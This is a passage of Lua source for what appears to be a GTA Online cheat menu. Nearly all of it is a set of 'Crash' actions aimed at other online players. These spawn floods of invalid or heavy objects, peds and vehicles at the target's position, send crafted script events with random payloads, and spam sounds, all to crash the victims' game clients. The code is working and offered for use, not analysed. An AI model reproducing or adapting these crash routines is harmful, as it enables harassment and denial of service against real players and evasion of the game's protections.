        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_jb1 = CreateObject(0xD75E01A6, TargetPlayerPos)
        local Object_jb2 = CreateObject(0x675D244E, TargetPlayerPos)
        local Object_jb3 = CreateObject(0x799B48CA, TargetPlayerPos)
        local Object_jb4 = CreateObject(0x68E49D4D, TargetPlayerPos)
        local Object_jb5 = CreateObject(0x66F34017, TargetPlayerPos)
        local Object_jb6 = CreateObject(0xDE1807BB, TargetPlayerPos)
        local Object_jb7 = CreateObject(0xC4C9551E, TargetPlayerPos)
        local Object_jb8 = CreateObject(0xCF37BA1F, TargetPlayerPos)
        local Object_jb9 = CreateObject(0xB69AD9F8, TargetPlayerPos)
        local Object_jb10 = CreateObject(0x5D750529, TargetPlayerPos)
        local Object_jb11 = CreateObject(0x1705D85C, TargetPlayerPos)
        for i = 0, 1000 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb7, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb8, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb9, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
                , true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb10, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb11, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            util.yield(10)
        end
        util.yield(5500)
        entities.delete_by_handle(Object_jb1)
        entities.delete_by_handle(Object_jb2)
        entities.delete_by_handle(Object_jb3)
        entities.delete_by_handle(Object_jb4)
        entities.delete_by_handle(Object_jb5)
        entities.delete_by_handle(Object_jb6)
        entities.delete_by_handle(Object_jb7)
        entities.delete_by_handle(Object_jb8)
        entities.delete_by_handle(Object_jb9)
        entities.delete_by_handle(Object_jb10)
        entities.delete_by_handle(Object_jb11)
    end)

    menu.action(Crash, "Bro Hug?", { "" }, "By MMT", function()
        util.toast("I'll try to convince them to leave :) ")
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0xE5022D03)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(20)
        local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), p_pos.x, p_pos.y, p_pos.z
            , false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
        TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), -1087, -3012, 13.94)
        util.yield(500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        util.yield(1000)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    end)

    menu.action(Crash, "iz5mc kill mom crash V1", { "iznmsl" }, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << pid,
                { 2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max),
                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                    math.random(int_min, int_max),
                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max),
                    math.random(int_min, int_max) })
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, { 1348481963, pid, math.random(int_min, int_max) })
        end
        menu.trigger_commands("givesh " .. players.get_name(pid))
        util.yield(100)
        util.trigger_script_event(1 << pid, { 495813132, pid, 0, 0, -12988, -99097, 0 })
        util.trigger_script_event(1 << pid, { 495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203 })
        util.trigger_script_event(1 << pid,
            { 495813132, pid, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8,
                827870001, 9, 17 })
    end)
    menu.action(Crash, "iz5mc kill mom crash V2", { "" }, "", function()
        for i = 1, 10 do
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            STREAMING.REQUEST_MODEL(-930879665)
            util.yield(10)
            STREAMING.REQUEST_MODEL(3613262246)
            util.yield(10)
            STREAMING.REQUEST_MODEL(452618762)
            util.yield(10)
            while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
            while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
            while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
            local a1 = entities.create_object(-930879665, cord)
            util.yield(10)
            local a2 = entities.create_object(3613262246, cord)
            util.yield(10)
            local b1 = entities.create_object(452618762, cord)
            util.yield(10)
            local b2 = entities.create_object(3613262246, cord)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
            util.yield(10)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
            util.yield(10)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
            util.yield(10)
        end
        if SE_Notifications then
            notification("Finished.", colors.red)
        end
    end)
    menu.action(Crash, "iz5mc kill mom crash V3", { "" }, "", function()
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
        pos.z = pos.z + 10
        veh = entities.get_all_vehicles_as_handles()

        for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
        end
    end)


    menu.action(Crash, "Medusa crash", { "" }, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        plauuepos.x = plauuepos.x + 5
        plauuepos.z = plauuepos.z + 5
        local hunter = {}
        for i = 1, 3 do
            for n = 0, 120 do
                hunter[n] = CreateVehicle(1077420264, plauuepos, 0)
                util.yield(0)
                ENTITY.FREEZE_ENTITY_POSITION(hunter[n], true)
                util.yield(0)
                VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
            end
            util.yield(190)
            for i = 1, #hunter do
                if hunter[i] ~= nil then
                    entities.delete_by_handle(hunter[i])
                end
            end
        end
        util.toast("Crash done QWQ")
        menu.trigger_commands("anticrashcam off")
        hunter = nil
        plauuepos = nil
    end)

    menu.action(Crash, "NPC Crash", { "" }, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = {}
        for i = 1, 60 do
            SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ONE"), TargetPlayerPos,
                ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            util.yield(1)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnPed_Wade[i])
            menu.trigger_commands("anticrashcam off")
        end
    end)

    menu.action(Crash, "Invalid Appearance Crash", { "" }, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
            ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false,
                false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(Crash, "Invalid model crashes", { "" }, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
        menu.trigger_commands("anticrashcam off")
    end)


    menu.click_slider(Crash, "Sound Crash", {}, "", 1, 2, 1, 1, function(on_change)
        if on_change == 1 then
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local time = util.current_time_millis() + 2000
            while time > util.current_time_millis() do
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                for i = 1, 10 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                        'MP_MISSION_COUNTDOWN_SOUNDSET', true, 10000, false)
                end
                util.yield()
            end
        end
        if on_change == 2 then
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local time = util.current_time_millis() + 1000
            while time > util.current_time_millis() do
                local pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                for i = 1, 20 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Object_Dropped_Remote', pos.x, pos.y, pos.z,
                        'GTAO_FM_Events_Soundset', true, 10000, false)
                end
                util.yield()
            end
        end
    end)

    menu.action(Crash, "Ghost Crash", { "" }, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed),
            true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
        local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos,
            ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0,
            true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
        local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos,
            ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false
                , false)
            util.yield(10 * math.random())
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
            util.yield(10 * math.random())
        end
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(Crash, "SE Crash", {}, "Crash player with SE", function()
        util.trigger_script_event(1 << PlayerID, { 962740265, PlayerID, 115831, 9999449 })
    end)

    menu.action(Crash, "Invalid Entity Crash", {}, "Crash player with invalid entity", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_slod_small_quadped = CreatePed(26, util.joaat("slod_small_quadped"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        local SpawnPed_slod_large_quadped = CreatePed(26, util.joaat("slod_large_quadped"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        local SpawnPed_slod_human = CreatePed(26, util.joaat("slod_human"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(2000)
        entities.delete_by_handle(SpawnPed_slod_small_quadped)
        entities.delete_by_handle(SpawnPed_slod_large_quadped)
        entities.delete_by_handle(SpawnPed_slod_human)
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(Crash, "Invalid Object Crash", {}, "Crash player with invalid object", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(Crash, "Chernobog Crash", {}, "Crash player with chernobog", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        SpawnedVehicleList = {};
        for i = 1, 80 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos,
                ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
            util.yield(50)
        end
        util.yield(5000)
        for i = 1, 80 do
            entities.delete_by_handle(SpawnedVehicleList[i])
        end
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(Crash, "Hunter Crash", {}, "Crash player with hunter", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnedVehicleList = {};
        for i = 1, 60 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            SpawnedVehicleList[i] = CreateVehicle(util.joaat("hunter"), TargetPlayerPos,
                ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
            util.yield(50)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnedVehicleList[i])
        end
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(Crash, "Chernobog Pro Crash", {}, "Crash player with chernobog pro", function()
        menu.trigger_commands("anticrashcam on")

        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        TargetPlayerPos.y = TargetPlayerPos.y + 1050
        SpawnedVehicleList1 = {};
        for i = 1, 60 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos,
                ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnedVehicleList1[i])
        end

        util.yield(1000)
        SpawnedVehicleList2 = {};
        for i = 1, 50 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos,
                ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 50 do
            entities.delete_by_handle(SpawnedVehicleList2[i])
        end

        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(Crash, "Wade Crash", {}, "Crash player with wade", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = {}
        for i = 1, 50 do
            SpawnPed_Wade[i] = CreatePed(50, 0xDFE443E5, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            SpawnPed_Wade[i] = CreatePed(50, 0x850446EC, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            SpawnPed_Wade[i] = CreatePed(50, 0x5F4C593D, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            SpawnPed_Wade[i] = CreatePed(50, 0x38951A1B, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            util.yield(1)
        end
        util.yield(10000)
        for i = 1, 50 do
            entities.delete_by_handle(SpawnPed_Wade[i])
            entities.delete_by_handle(SpawnPed_Wade[i])
            entities.delete_by_handle(SpawnPed_Wade[i])
            entities.delete_by_handle(SpawnPed_Wade[i])
        end
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(Crash, "Invalid Clothing Crash", {}, "Crash player with invalid clothes", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
            ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false,
                false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(Crash, "Trailer Crash", {}, "Crash player with trailer", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
        SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
        SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
        SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
        SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
        SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
        SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)

        ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false,
            0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false,
            0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0
            , true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0
            , true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0,
            true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0,
            true)
        for i = 0, 100 do
            TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(SpawnedTowtruck)
        entities.delete_by_handle(SpawnedDune1)
        entities.delete_by_handle(SpawnedDune2)
        entities.delete_by_handle(SpawnedBarracks31)
        entities.delete_by_handle(SpawnedBarracks32)
        entities.delete_by_handle(SpawnedBarracks1)
        entities.delete_by_handle(SpawnedBarracks2)
    end)


local main_menu = menu.list(MenuPlayerRemovalCrash, "Menu Crashes", {}, "Other Menu Crashes")                                        --Credits to addict script

menu.action(main_menu,"North Crash", {"northcrash"}, "Working.", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local michael = util.joaat("player_zero")
while not STREAMING.HAS_MODEL_LOADED(michael) do
STREAMING.REQUEST_MODEL(michael)
util.yield()
end
local ped = entities.create_ped(0, michael, pos, 0)
PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 7, 0)
util.yield()
util.yield(500)
entities.delete_by_handle(ped)
util.toast("North Crash Sent to " .. players.get_name(csPID))
util.log("North Crash Sent to " .. players.get_name(csPID))
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(main_menu,"North Crash", {"northcrash"}, "Working. Can't crash yourself with toggled.", function()
if pid ~= players.user() then
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local michael = util.joaat("player_zero")
while not STREAMING.HAS_MODEL_LOADED(michael) do
STREAMING.REQUEST_MODEL(michael)
util.yield()
end
local ped = entities.create_ped(0, michael, pos, 0)
PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 7, 0)
util.yield()
util.yield(500)
entities.delete_by_handle(ped)
util.toast("North Crash Sent to " .. players.get_name(csPID))
util.log("North Crash Sent to " .. players.get_name(csPID))
end
end)

menu.action(main_menu,"Cherax Crash", {"cheraxcrash"}, "Working.", function()
menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(csPID))
menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(csPID))
menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(csPID))
menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(csPID))
util.yield()
util.toast("Cherax Crash Sent to " .. players.get_name(csPID))
util.log("Cherax Crash Sent to " .. players.get_name(csPID))
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(main_menu,"Cherax Crash", {"cheraxcrash"}, "Working.", function()
if pid ~= players.user() then
menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(csPID))
menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(csPID))
menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(csPID))
